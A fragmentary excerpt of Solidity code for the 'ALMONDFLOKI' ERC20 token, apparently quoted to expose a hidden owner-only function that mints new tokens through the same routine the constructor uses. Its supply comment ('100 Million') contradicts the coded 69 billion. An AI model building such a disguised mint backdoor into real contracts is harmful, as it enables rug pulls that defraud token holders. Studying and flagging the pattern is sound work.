...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function AlmondFloki(uint256 amount) public onlyOwner {
    _AlmondFloki(msg.sender, amount);
    }
    ...
    function _AlmondFloki(address account, uint256 amount) internal virtual {
...
contract ALMONDFLOKI is ERC20 {

    uint tokenTotalSupply = 69000000000; // 100 Million Token Supply

    constructor() public ERC20("ALMONDFLOKI", "ALMONDFLOKI") {
        _AlmondFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}